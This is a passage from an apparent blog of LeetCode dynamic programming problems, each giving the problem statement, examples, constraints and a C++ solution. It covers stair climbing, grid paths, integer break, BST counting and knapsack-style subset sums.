<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 2</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There are two ways to climb to the top.</span><br><span class="line">1. 1 step + 1 step</span><br><span class="line">2. 2 steps</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 3</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: There are three ways to climb to the top.</span><br><span class="line">1. 1 step + 1 step + 1 step</span><br><span class="line">2. 1 step + 2 steps</span><br><span class="line">3. 2 steps + 1 step</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 45</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> * dp = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> dp[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">            dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> dp[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">            dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-1</span>] + dp[i<span class="number">-2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> dp[n];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="746-Min-Cost-Climbing-Stairs"><a href="#746-Min-Cost-Climbing-Stairs" class="headerlink" title="746.Min Cost Climbing Stairs"></a>746.Min Cost Climbing Stairs</h3><p><strong>Description:</strong></p>
<p>You are given an integer array <code>cost</code> where <code>cost[i]</code> is the cost of <code>ith</code> step on a staircase. Once you pay the cost, you can either climb one or two steps.</p>
<p>You can either start from the step with index <code>0</code>, or the step with index <code>1</code>.</p>
<p>Return <em>the minimum cost to reach the top of the floor</em>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: cost = [10,15,20]</span><br><span class="line">Output: 15</span><br><span class="line">Explanation: You will start at index 1.</span><br><span class="line">- Pay 15 and climb two steps to reach the top.</span><br><span class="line">The total cost is 15.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: cost = [1,100,1,1,1,100,1,1,100,1]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: You will start at index 0.</span><br><span class="line">- Pay 1 and climb two steps to reach index 2.</span><br><span class="line">- Pay 1 and climb two steps to reach index 4.</span><br><span class="line">- Pay 1 and climb two steps to reach index 6.</span><br><span class="line">- Pay 1 and climb one step to reach index 7.</span><br><span class="line">- Pay 1 and climb two steps to reach index 9.</span><br><span class="line">- Pay 1 and climb one step to reach the top.</span><br><span class="line">The total cost is 6.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>2 &lt;= cost.length &lt;= 1000</code></li>
<li><code>0 &lt;= cost[i] &lt;= 999</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        vector &lt;<span class="keyword">int</span>&gt; <span class="built_in">dp</span>(n+<span class="number">1</span>);</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i<span class="number">-1</span>] + cost[i<span class="number">-1</span>], dp[i<span class="number">-2</span>] + cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="62-Unique-Paths"><a href="#62-Unique-Paths" class="headerlink" title="62. Unique Paths"></a>62. Unique Paths</h3><p><strong>Description:</strong></p>
<p>There is a robot on an <code>m x n</code> grid. The robot is initially located at the <strong>top-left corner</strong> (i.e., <code>grid[0][0]</code>). The robot tries to move to the <strong>bottom-right corner</strong> (i.e., <code>grid[m - 1][n - 1]</code>). The robot can only move either down or right at any point in time.</p>
<p>Given the two integers <code>m</code> and <code>n</code>, return <em>the number of possible unique paths that the robot can take to reach the bottom-right corner</em>.</p>
<p>The test cases are generated so that the answer will be less than or equal to <code>2 * 109</code>.</p>
<p> <strong>Example 1:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2018/10/22/robot_maze.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: m = 3, n = 7</span><br><span class="line">Output: 28</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: m = 3, n = 2</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: From the top-left corner, there are a total of 3 ways to reach the bottom-right corner:</span><br><span class="line">1. Right -&gt; Down -&gt; Down</span><br><span class="line">2. Down -&gt; Down -&gt; Right</span><br><span class="line">3. Down -&gt; Right -&gt; Down</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= m, n &lt;= 100</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> grid[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            grid[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            grid[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                grid[i][j] = grid[i<span class="number">-1</span>][j] + grid[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> grid[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>*<strong>Number Theory</strong></p>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> numerator = <span class="number">1</span>; <span class="comment">// 分子</span></span><br><span class="line">        <span class="keyword">int</span> denominator = m - <span class="number">1</span>; <span class="comment">// 分母</span></span><br><span class="line">        <span class="keyword">int</span> count = m - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> t = m + n - <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">            numerator *= (t--);</span><br><span class="line">            <span class="keyword">while</span> (denominator != <span class="number">0</span> &amp;&amp; numerator % denominator == <span class="number">0</span>) &#123;</span><br><span class="line">                numerator /= denominator;</span><br><span class="line">                denominator--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numerator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>Reference:</strong></p>
<p><a href="https://github.com/youngyangyang04/leetcode-master/blob/master/problems/0062.%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84.md">https://github.com/youngyangyang04/leetcode-master/blob/master/problems/0062.%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84.md</a></p>
<h3 id="63-Unique-Paths-II"><a href="#63-Unique-Paths-II" class="headerlink" title="63. Unique Paths II"></a>63. Unique Paths II</h3><p><strong>Description:</strong></p>
<p>You are given an <code>m x n</code> integer array <code>grid</code>. There is a robot initially located at the <strong>top-left corner</strong> (i.e., <code>grid[0][0]</code>). The robot tries to move to the <strong>bottom-right corner</strong> (i.e., <code>grid[m - 1][n - 1]</code>). The robot can only move either down or right at any point in time.</p>
<p>An obstacle and space are marked as <code>1</code> or <code>0</code> respectively in <code>grid</code>. A path that the robot takes cannot include <strong>any</strong> square that is an obstacle.</p>
<p>Return <em>the number of possible unique paths that the robot can take to reach the bottom-right corner</em>.</p>
<p>The testcases are generated so that the answer will be less than or equal to <code>2 * 109</code>.</p>
<p><strong>Example 1:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/04/robot1.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: obstacleGrid = [[0,0,0],[0,1,0],[0,0,0]]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There is one obstacle in the middle of the 3x3 grid above.</span><br><span class="line">There are two ways to reach the bottom-right corner:</span><br><span class="line">1. Right -&gt; Right -&gt; Down -&gt; Down</span><br><span class="line">2. Down -&gt; Down -&gt; Right -&gt; Right</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/04/robot2.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: obstacleGrid = [[0,1],[0,0]]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>m == obstacleGrid.length</code></li>
<li><code>n == obstacleGrid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 100</code></li>
<li><code>obstacleGrid[i][j]</code> is <code>0</code> or <code>1</code>.</li>
</ul>
<p><strong>Dode:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; obstacleGrid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = obstacleGrid[<span class="number">0</span>].<span class="built_in">size</span>();     <span class="comment">//column</span></span><br><span class="line">        <span class="keyword">int</span> n = obstacleGrid.<span class="built_in">size</span>();        <span class="comment">//raw</span></span><br><span class="line">        <span class="keyword">int</span> dp[n][m];</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(dp));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[<span class="number">0</span>][i] == <span class="number">1</span>) &#123;</span><br><span class="line">                dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (obstacleGrid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][m<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="343-Integer-Break"><a href="#343-Integer-Break" class="headerlink" title="343.Integer Break"></a>343.Integer Break</h3><p><strong>Description:</strong></p>
<p>Given an integer <code>n</code>, break it into the sum of <code>k</code> <strong>positive integers</strong>, where <code>k &gt;= 2</code>, and maximize the product of those integers.</p>
<p>Return <em>the maximum product you can get</em>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 2</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: 2 = 1 + 1, 1 × 1 = 1.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 10</span><br><span class="line">Output: 36</span><br><span class="line">Explanation: 10 = 3 + 3 + 4, 3 × 3 × 4 = 36.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>2 &lt;= n &lt;= 58</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i/<span class="number">2</span>; j++) &#123;</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], <span class="built_in">max</span>(dp[j], j) * <span class="built_in">max</span>(dp[i-j], i-j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="96-Unique-Binary-Search-Trees"><a href="#96-Unique-Binary-Search-Trees" class="headerlink" title="96. Unique Binary Search Trees"></a>96. Unique Binary Search Trees</h3><p><strong>Description:</strong></p>
<p>Given an integer <code>n</code>, return *the number of structurally unique **BST’*<em>s (binary search trees) which has exactly</em> <code>n</code> <em>nodes of unique values from</em> <code>1</code> <em>to</em> <code>n</code>.</p>
<p><strong>Example 1:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2021/01/18/uniquebstn3.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 3</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 1</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 19</code></li>
</ul>
<p><strong>Code:</strong></p>
<p>Choose every number as the root for one time. Calculate right and left dividedly.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                dp[i] += dp[i-j<span class="number">-1</span>] * dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="416-Partition-Equal-Subset-Sum-01背包问题"><a href="#416-Partition-Equal-Subset-Sum-01背包问题" class="headerlink" title="416. Partition Equal Subset Sum(01背包问题)"></a>416. Partition Equal Subset Sum(01背包问题)</h3><p><strong>Description</strong></p>
<p>Given a <strong>non-empty</strong> array <code>nums</code> containing <strong>only positive integers</strong>, find if the array can be partitioned into two subsets such that the sum of elements in both subsets is equal.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,5,11,5]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: The array can be partitioned as [1, 5, 5] and [11].</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3,5]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: The array cannot be partitioned into equal sum subsets.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 200</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum /= <span class="number">2</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">bool</span>&gt;&gt; <span class="built_in">dp</span>(n);</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i].<span class="built_in">resize</span>(sum+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= sum; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == nums[<span class="number">0</span>]) &#123;</span><br><span class="line">                dp[<span class="number">0</span>][j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= sum; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= nums[i] &amp;&amp; dp[i<span class="number">-1</span>][j-nums[i]] == <span class="literal">true</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] == j || dp[i<span class="number">-1</span>][j] == <span class="literal">true</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][sum];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="1049-Last-Stone-Weight-II"><a href="#1049-Last-Stone-Weight-II" class="headerlink" title="1049 Last Stone Weight II"></a>1049 Last Stone Weight II</h3><p><strong>Description:</strong></p>
<p>You are given an array of integers <code>stones</code> where <code>stones[i]</code> is the weight of the <code>ith</code> stone.</p>
<p>We are playing a game with the stones. On each turn, we choose any two stones and smash them together. Suppose the stones have weights <code>x</code> and <code>y</code> with <code>x &lt;= y</code>. The result of this smash is:</p>
<ul>
<li>If <code>x == y</code>, both stones are destroyed, and</li>
<li>If <code>x != y</code>, the stone of weight <code>x</code> is destroyed, and the stone of weight <code>y</code> has new weight <code>y - x</code>.</li>
</ul>
<p>At the end of the game, there is <strong>at most one</strong> stone left.</p>
<p>Return <em>the smallest possible weight of the left stone</em>. If there are no stones left, return <code>0</code>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: stones = [2,7,4,1,8,1]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation:</span><br><span class="line">We can combine 2 and 4 to get 2, so the array converts to [2,7,1,8,1] then,</span><br><span class="line">we can combine 7 and 8 to get 1, so the array converts to [2,1,1,1] then,</span><br><span class="line">we can combine 2 and 1 to get 1, so the array converts to [1,1,1] then,</span><br><span class="line">we can combine 1 and 1 to get 0, so the array converts to [1], then that&#x27;s the optimal value.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: stones = [31,26,33,21,40]</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= stones.length &lt;= 30</code></li>
<li><code>1 &lt;= stones[i] &lt;= 100</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lastStoneWeightII</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = stones.<span class="built_in">size</span>(), sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            sum += stones[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">1501</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> result = sum / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = result; j &gt;= stones[i]; j--) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-stones[i]] + stones[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum - dp[result] - dp[result];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="494-Target-Sum"><a href="#494-Target-Sum" class="headerlink" title="* 494 Target Sum"></a>* 494 Target Sum</h3><p><strong>Description:</strong></p>
<p>You are given an integer array <code>nums</code> and an integer <code>target</code>.</p>
<p>You want to build an <strong>expression</strong> out of nums by adding one of the symbols <code>&#39;+&#39;</code> and <code>&#39;-&#39;</code> before each integer in nums and then concatenate all the integers.</p>
<ul>
<li>For example, if <code>nums = [2, 1]</code>, you can add a <code>&#39;+&#39;</code> before <code>2</code> and a <code>&#39;-&#39;</code> before <code>1</code> and concatenate them to build the expression <code>&quot;+2-1&quot;</code>.</li>
</ul>
<p>Return the number of different <strong>expressions</strong> that you can build, which evaluates to <code>target</code>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,1,1,1,1], target = 3</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: There are 5 ways to assign symbols to make the sum of nums be target 3.</span><br><span class="line">-1 + 1 + 1 + 1 + 1 = 3</span><br><span class="line">+1 - 1 + 1 + 1 + 1 = 3</span><br><span class="line">+1 + 1 - 1 + 1 + 1 = 3</span><br><span class="line">+1 + 1 + 1 - 1 + 1 = 3</span><br><span class="line">+1 + 1 + 1 + 1 - 1 = 3</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1], target = 1</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 20</code></li>
<li><code>0 &lt;= nums[i] &lt;= 1000</code></li>
<li><code>0 &lt;= sum(nums[i]) &lt;= 1000</code></li>
<li><code>-1000 &lt;= target &lt;= 1000</code></li>
</ul>
<p><strong>Code:</strong></p>
